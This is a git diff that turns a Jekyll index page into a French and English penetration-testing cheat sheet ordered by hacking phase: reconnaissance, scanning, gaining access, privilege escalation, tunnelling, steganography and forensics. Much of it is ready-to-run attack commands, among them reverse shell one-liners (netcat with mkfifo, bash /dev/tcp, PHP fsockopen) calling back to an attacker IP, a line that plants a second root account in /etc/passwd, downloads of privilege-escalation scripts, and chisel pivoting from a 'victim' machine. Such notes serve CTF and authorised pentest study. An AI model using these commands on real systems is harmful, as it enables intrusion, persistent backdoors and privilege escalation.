@@ -1,42 +1,341 @@
-## Attacks
+---
+# Feel free to add content and custom Front Matter to this file.
+# To modify the layout, see https://jekyllrb.com/docs/themes/#overriding-theme-defaults
+
+layout: default
+---
+# Commands by Hacking phases
+
+
+## Recognition
+
+{% highlight bash %}
+host [DOMAIN] # ressort IPv4 IPv6
+{% endhighlight %}
+
+```sh
+whois [DOMAIN] # permet de récupérer des infos sur les serveurs dns utilisés (serveur ip dispo, nom proprio, adresse)
+```
+
+```sh
+dig [nomDomaine] # récupérer les adresses de DNS. Possibilité de récupérer d'autres informations avec les options -h
+```
+
+```sh
+dnsenum [nomDomaine] # récuperer enregistrement DNS et serveur Nx
+```
+
+```sh
+dmitry # @IP, domaine, mails, scan de ports...
+```
+
+```sh
+tcptraceroute [nomDomaine]
+```
+
+```sh
+theharvester -d [nomDomaine] # récupération d'emails, noms d'hotes
+```
+
+```sh
+maltego # recherche d'infos sur une personne, un nom de domaine...
+```
+
+
+[**Way Back Machine**](http://web.archive.org/)
+
+[**Shodan**](https://www.shodan.io/)
+
+[**Exploit Database**](https://www.exploit-db.com/)
+
+
+___
+## Scanning
+
+### Machine enumeration
+
+```sh
+fping/ping # vérifier la présence d'une machine sur le réseau
+fping -g [réseau local] # donne toutes les @ du réseau local qui sont reachable
+```
+
+**nmap**: scanner de port open source (graphique -> zenmap)
+```sh
+nmap -sV -p- [ip] # scan network or a machine
+ -sV # service version detection
+ -O  # operating system detection
+ -v  # verbose or -vv
+ -A  # agressives scan (OS, script, traceroute) open ports, services, version --> when you don't care how 'loud' you are
+
+ -Pn # if I don't want to ping the host
+
+ --script vuln # if I want to run all scripts out of the vulnerability category
+# all categories: https://nmap.org/book/nse-usage.html
+
+# Timing template. (increase the speed your scan runs at) - /!\ higher speeds are noisier, and can incur errors!
+ -T5
+
+#### Ping sweep ####
+-sn [networkIp]/[CIDR] # to obtain a map of the network structure.
+
+#### SAVE THE OUTPUT ####
+ -oA # three major formats
+ -oN # normal format
+ -oG # Grepable format
+ -oX # output in xml format
+
+xsltproc filename.xml -o filename.html # on peut ouvrir dans le navigateur d'un récapitulatif facile à lire.
+```
+
+
+<br>
+
+
+```sh
+nessus # signale les faiblesses potentielles sur les machines testées (à télécharger sur tenable)
+/etc/init.d/nessusd start # démarrer nessus
+http://localhost:8834 # accès à nessus + s'enregistrer sur tenable pour un code d'activation
+```
+**wireshark** : capture des trames...
 
 
 
-<details>
+### Website Scanner
+
+```sh
+nikto -h [url]
+wapiti
+```
+
+```sh
+gobuster dir -u [url] -w [wordlist_path] -e -x .php,.txt,.html -o output.txt
+dirbuster
+wfuzz
+```
+
+### URL/.git/
+
+```sh
+wget --mirror -I .git URL/.git/
+git checkout -- # if some files have been deleted, get them back
+git log
+git checkout <LOG-ID> # go back to a previous commit
+
+git log --all --full-history
+git show <COMMIT-ID>
+git log --stat
+[script export.sh]
+```
+
++ **git-dumper**: tool to dump a git repository from a website: https://github.com/arthaud/git-dumper
++ **git-tools**: A repository with 3 tools for pwn'ing websites with .git repositories available: https://github.com/internetwache/GitTools
++ **githacker**: A Git source leak exploit tool that restores the entire Git repository, including data from stash, for white-box auditing and analysis of developers' mind: https://github.com/captain-noob/GitHacker
+
+___
+## Exploit (Gaining Access)
+
+### Reverse Shell
+
+#### Shell upgrading
+
+```sh
+/usr/bin/script -qc /bin/bash /dev/null # works almost all the time
+
+python3 -c 'import pty;pty.spawn("/bin/bash")' # only if python is installed
+```
+
+#### Shell Stabilization
+```sh
+export TERM=xterm # this will give us access to term commands such as clear
+Ctrl + Z # background the shell
+stty raw -echo; fg # This does two things: 1. it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+```
+
+#### BASH reverse shell one line
+```sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] 4444 >/tmp/f
+
+bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" # possibility not to use 'bash -c' at the beginning
+
+nc [IP] [PORT]
+
+php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+___
+## Persistence (Maintaining Access) - Privilege Escalation
+
+```sh
+echo "root2:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> /etc/passwd # to create another root user
+```
 
 
-1. [Bruteforce](attacks/bruteforce/index.md)
-2. [DDOS](attacks/ddos/index.md)
-3. [Network Sniffing](attacks/networkSniffing/index.md)
-4. [Phone Hack](attacks/phoneHack/index.md)
-5. [Social Engineering](attacks/socialEngineering/index.md)
-6. [SQL injection](attacks/sqli/index.md)
-7. [Buffer Overflow](attacks/bufferOverflow/index.md)
-8. [Click & Cursor Jacking](attacks/click&cursorJacking/index.md)
-9. [CSRF](attacks/csrf/index.md)
-10. [DNS Spoofing](attacks/dnsSpoofing/index.md)
-11. [MITM](attacks/mitm/index.md)
-12. [LFI & RFI](attacks/lfi&rfi/index.md)
-13. [Network Spoofing](attacks/networkSpoofing/index.md)
-14. [Wifi](attacks/wifi/index.md)
-15. [XSS](attacks/xss/index.md)
-16. [Zombie scanning](attacks/zombieScanning/index.md)
-
-</details>
+### Linux Privilege Escalation
 
 
-## CTF
+```sh
+sudo -l # check current privileges
 
-1. [CTF phases](tips_and_tricks/index.md)
-2. [Google Dorks](tips_and_tricks/googleDorks/index.md)
+netstat -ltupn # listening port
+ss -tulw # listening port
+
+cat /etc/crontab # checko cronjob
+```
+
+#### FIND
+
+```sh
+find / -iname "*config*.php" 2>/dev/null # looking for config files - cat [filename] | grep -i "db_"
+find / -user root -perm -u=s 2>/dev/null # Find all files/dirs that are owned by root and have at least the SUID permission
+
+find / -group [name] 2>/dev/null # Find all files/dirs owned by a group
+find / -user [username] 2>/dev/null # Find all files/dirs owned by a user
+
+-perm 444 # exactly readable by everyone
+-perm /444 # only readable by everyone
+
+-exec [command] [option] {}\; 2>/dev/null # {} corresponds to the files returned by the find command
+```
+
+#### GREP
+
+```sh
+grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" # grep ip addresses from your output.
+```
+
+#### LSE - linux-smart-enumeration
+https://github.com/diego-treitos/linux-smart-enumeration
+
+```sh
+wget "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;chmod 700 lse.sh
+
+curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh
+```
 
 
-## Scripts, Git Repository & Tools
+#### LES - linux-exploit-suggester
+https://github.com/mzet-/linux-exploit-suggester
 
-<details>
+```sh
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh;chmod 700 les.sh
+```
 
-1. [Scripts](scripts/index.md)
-2. [Git repository](gitRepository/index.md)
-3. [Tools & Tips](tips_and_tricks/otherToolsAndTips/index.md)
+#### LinPEAS - Linux Privilege Escalation Awesome Script
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
 
-</details>
+```sh
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -Lo lPEAS.sh;chmod 700 lPEAS.sh
+```
+___
+## Clearing Track
+
+TODO
+
+___
+# Other useful commands
+
+## Steganography
+
+Find images information
+
+```sh
+identify -verbose
+pngcheck [image]
+zsteg [image] # detect stegano data hidden in PNG & BMP
+```
+
+```sh
+steghide extract -sf [filename]
+stegcracker [file] [wordlist] # bruteforce steghide passphrase
+```
+
+___
+## HTTP Server
+
+### One line
+
+```sh
+python -m SimpleHTTPServer 8000 # Python 2.x
+
+python -m http.server 8000 # Python 3.x
+
+updog # allow uploads
+```
+
+___
+## SSH
+
+```sh
+ssh [ip] -p [port] # connect to an ssh server
+```
+
+### SSH port forwarding
+```sh
+ssh -N user@[IP_distant] -L [@_redirection_machine]:[port_redirection]:[IP_redirigee]:[port_redirige]
+```
+
+
+Example:
+```sh
+ssh -N user@10.10.10.10 -L 172.17.0.1:4441:192.168.0.100:80
+```
+Sur la machine `10.10.10.10`, `user` fait tourner un serveur web au niveau de son interface `192.168.0.100:80`. Ici, je redirige sur mon adresse `172.17.0.1` (celle sur le même réseau que mon container docker) et sur le port 4441. Donc depuis mon navigateur, http://172.17.0.1:4441 est joignable. En indiquant un proxy sur `172.17.0.2:4440`, je peux modifier les requêtes sur Burpsuite si besoin.
+
+## Chisel
+
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+
+### Port forwarding
+
+```sh
+# on the attacker
+cd /path/where/chisel/is # binary file
+updog # or whatever cmdline to setup a http server
+
+# on the victim
+wget IP:PORT/chisel
+chmod +x chisel # set it executable
+
+# on the attacker
+chisel server --reverse --port 9002 # port forwarding
+
+# on the victim
+./chisel client YOUR_IP:9002 R:9001:[redirectedIP]:[redirectedPort]
+
+# Now you have access on the attacker's machine to : localhost:9001
+```
+___
+## File Editor
+
+```sh
+hexeditor # hexadecimal
+```
+
+___
+## Web
+
+
+### Attaque SQL
+
+```sh
+sqlmap -u "http://172.16.128.39:8080/student_grade/index.php?student_id=" --tables -D Dysto_School -T student
+```
+
+### Website request command line
+```sh
+curl -v [url]
+curl -v -X POST [url]
+wget [url]
+```
+
+___
+## Forensic Investigation
+```sh
+volatility
+testdisk
+```
+
+### Hidden files extraction
+```sh
+binwalk -e
+```
